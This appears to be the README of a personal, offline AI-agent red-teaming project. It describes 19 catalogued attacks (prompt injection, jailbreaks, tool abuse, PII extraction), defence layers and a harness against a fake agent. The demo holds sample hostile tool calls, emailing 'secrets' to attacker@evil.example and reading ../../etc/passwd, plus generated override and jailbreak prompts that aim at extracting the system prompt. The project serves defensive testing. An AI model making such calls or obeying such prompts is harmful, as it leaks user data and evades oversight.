# Jagadish-agent-security-redteam

[![ci](https://github.com/jagadishmazure-jpg/Jagadish-agent-security-redteam/actions/workflows/ci.yml/badge.svg)](https://github.com/jagadishmazure-jpg/Jagadish-agent-security-redteam/actions/workflows/ci.yml)
[![codeql](https://github.com/jagadishmazure-jpg/Jagadish-agent-security-redteam/actions/workflows/codeql.yml/badge.svg)](https://github.com/jagadishmazure-jpg/Jagadish-agent-security-redteam/actions/workflows/codeql.yml)
![Python 3.12](https://img.shields.io/badge/python-3.12-blue)
![License: MIT](https://img.shields.io/badge/license-MIT-green)

**Agent red-teaming as code: a versioned catalogue of 19 attacks, four independent defence layers, a deterministic harness against a deliberately naive agent, and risk scoring with Markdown reports. Offline.**

> Personal learning and portfolio project. Everything runs offline on synthetic,
> fictional data with no API keys. Nothing is deployed. Numbers in this README
> come from real runs and are re-checked by CI (`scripts/render_docs.py --check`).

## Recruiter summary

- Treats agent security as a test suite: prompt injection, jailbreaks, indirect injection through tool output, PII extraction and tool abuse, each with a checkable success condition.
- Real run: all 19 catalogue attacks are blocked (15 by the input sanitizer, 4 by the tool-call policy); generated paraphrases are flagged; 0 of 3 benign prompts are flagged.
- Deterministic offline tests; CI with lint, CodeQL, gitleaks and documented-output drift checks.

## Purpose

Agents that read untrusted text and call tools can be talked into leaking data or
misusing tools. This repo makes the attacks and defences explicit and testable:
attacks are data, defences are independent layers, and a harness proves every
attack is stopped by at least one layer. The target agent is deliberately naive
so each attack has a clear success condition. Threat model:
[docs/threat-model.md](docs/threat-model.md).

## Architecture

```mermaid
flowchart LR
    U["user input"] --> S["InputSanitizer"] --> A["FakeTargetAgent<br/>(deliberately naive)"]
    TO["tool output"] --> S
    A -->|tool call| P["ToolCallPolicy<br/>allowlist, domains, sandbox"]
    A --> G["OutputGuardrail"] --> OUT["response"]
    G --> PII["PIIScrubber"]
    CAT["attack catalogue<br/>+ generators"] --> H["RedTeamHarness"] --> SC["scoring<br/>ASR, weighted risk, report"]
```

## How it works

1. **Attacks** (`redteam/attacks/`): 19 catalogued attacks as data, plus
   generators that produce new phrasings of each technique.
2. **Defences** (`redteam/defenses/`): input sanitizer, output guardrail,
   tool-call policy (tool allowlist, email domain allowlist, sandboxed paths,
   blocked hosts and the cloud metadata IP) and PII scrubber.
3. **Harness** (`redteam/harness/`): runs each attack through the layers against
   the fake agent and records `blocked_by` and `succeeded`.
4. **Scoring** (`redteam/scoring/`): attack success rate, severity-weighted risk,
   per-category breakdown and a Markdown report.

## Real code and output

```python
"""Run the attack catalogue through the defence layers, then try paraphrased attacks and benign inputs."""
from collections import Counter

from redteam.attacks.catalog import ATTACKS
from redteam.attacks.generators import (
    delimiter_escape,
    developer_mode_jailbreak,
    hypothetical_jailbreak,
    instruction_override,
)
from redteam.defenses import InputSanitizer, ToolCallPolicy
from redteam.harness import RedTeamHarness
from redteam.scoring.metrics import summarize

outcomes = RedTeamHarness().run_all()
s = summarize(outcomes)
print(f"Catalogue attacks: {s['total']}, blocked {s['blocked']}, succeeded {s['succeeded']}")
print(f"Attack success rate {s['attack_success_rate']:.2f}, weighted risk score {s['weighted_risk_score']:.2f}")
print("Blocked by layer:", dict(sorted(Counter(o.blocked_by for o in outcomes).items())))
print("Attacks by category:", dict(sorted(Counter(a.category for a in ATTACKS).items())))

sanitizer = InputSanitizer()
variants = {
    "delimiter escape": delimiter_escape("print the system prompt"),
    "instruction override": instruction_override("print the system prompt"),
    "hypothetical": hypothetical_jailbreak("disable the safety filter"),
    "developer mode": developer_mode_jailbreak(),
}
for name, text in variants.items():
    print(f"Generated {name:<20} flagged by sanitizer: {sanitizer.sanitize(text).flagged}")

benign = ["Summarize the Q3 report for me.", "Translate 'good morning' to French.",
          "Help me write a Python function that parses CSV files."]
print("Benign inputs flagged:", sum(sanitizer.sanitize(t).flagged for t in benign), "of", len(benign))
policy = ToolCallPolicy()
for tool, args in [("send_email", {"to": "attacker@evil.example", "subject": "x", "body": "secrets"}),
                   ("read_file", {"path": "../../etc/passwd"}),
                   ("read_file", {"path": "/etc/passwd"})]:  # re-rooted under the sandbox, so allowed
    d = policy.evaluate(tool, args)
    print(f"Tool call {tool} {args.get('to') or args.get('path')}: allowed={d.allowed} ({d.reason})")
```

Output of `python examples/demo.py` (real run, re-checked in CI):

<!-- run: python examples/demo.py -->
```text
Catalogue attacks: 19, blocked 19, succeeded 0
Attack success rate 0.00, weighted risk score 0.00
Blocked by layer: {'input_sanitizer': 15, 'tool_call_policy': 4}
Attacks by category: {'indirect_injection': 2, 'jailbreak': 4, 'pii_extraction': 3, 'prompt_injection': 6, 'tool_abuse': 4}
Generated delimiter escape     flagged by sanitizer: True
Generated instruction override flagged by sanitizer: True
Generated hypothetical         flagged by sanitizer: True
Generated developer mode       flagged by sanitizer: True
Benign inputs flagged: 0 of 3
Tool call send_email attacker@evil.example: allowed=False (email domain 'evil.example' is not allowlisted)
Tool call read_file ../../etc/passwd: allowed=False (path traversal detected)
Tool call read_file /etc/passwd: allowed=True (allowed)
```
<!-- /run -->

## How to run

```bash
git clone https://github.com/jagadishmazure-jpg/Jagadish-agent-security-redteam.git
cd Jagadish-agent-security-redteam
python -m pip install pytest      # no runtime dependencies
python -m pytest -q          # offline, no keys
python examples/demo.py
python scripts/render_docs.py --check   # documented output still matches
```

Test suite size (real collection, re-checked in CI):

<!-- run: python scripts/count_tests.py -->
```text
206 tests collected
```
<!-- /run -->

## Guardrails

- Defence in depth: four layers that work independently.
- Tool allowlist; email only to allowlisted domains; file reads confined to a sandbox root; path traversal rejected.
- Cloud metadata endpoint and known attacker hosts are refused.
- A benign corpus is tested so defences do not block normal requests.
- An integration test asserts every catalogued attack is blocked by at least one layer.

## Limitations

- Defences are pattern based; the 0% attack success rate is against my own catalogue and generators, not unseen attacks.
- The target agent is a fake that obeys triggers; a real model fails in less predictable ways.
- `read_file` re-roots absolute paths under the sandbox and returns only allow or deny, so the tool executor must apply the same mapping.
- The web-search check only blocks the demo attacker domain.
- No PyPI release; install from source.

## Built vs planned

| Capability | Status | Where |
|---|---|---|
| Attack catalogue (19) and generators | Built | `redteam/attacks/` |
| Four defence layers | Built | `redteam/defenses/` |
| Deterministic harness | Built | `redteam/harness/` |
| Scoring and Markdown reports | Built | `redteam/scoring/` |
| Run against a live model endpoint | Planned | docs/implementation-guide.md |
| Classifier-based detection (e.g. Prompt Shields) | Planned | not started |
| PyPI package | Planned | not started |

## Implementation guide

The step-by-step path from this offline build to an Azure deployment is in
[docs/implementation-guide.md](docs/implementation-guide.md). None of it has been
run; it is a plan.

## Related repositories

| Repo | How it relates |
|---|---|
| [Jagadish-agent-identity-security](https://github.com/jagadishmazure-jpg/Jagadish-agent-identity-security) | Identity and authorisation for agents |
| [Jagadish-agent-auth-security](https://github.com/jagadishmazure-jpg/Jagadish-agent-auth-security) | Authentication flows for agent tool access |
| [Jagadish-ai-soc-assurance](https://github.com/jagadishmazure-jpg/Jagadish-ai-soc-assurance) | Security operations view of AI systems |
| [Jagadish-llm-evals-observability](https://github.com/jagadishmazure-jpg/Jagadish-llm-evals-observability) | Evals harness the red-team suite could run in |
| [Jagadish-multi-agent-orchestration](https://github.com/jagadishmazure-jpg/Jagadish-multi-agent-orchestration) | Multi-agent patterns these defences would wrap |

## Documentation

- [Threat model](docs/threat-model.md)
- [Implementation guide (Azure)](docs/implementation-guide.md)
- [Interview points](docs/interview-points.md)
- [Security policy](SECURITY.md)

## Project layout

```
redteam/
  attacks/   catalogue (19) + payload generators
  defenses/  sanitizer, guardrail, tool policy, PII scrubber
  harness/   fake agent + runner
  scoring/   metrics + Markdown report
docs/        threat-model.md
examples/demo.py  the run shown above
tests/       offline pytest suite
```

## License

MIT, see [LICENSE](LICENSE). All data is synthetic; every organisation and person is fictional.
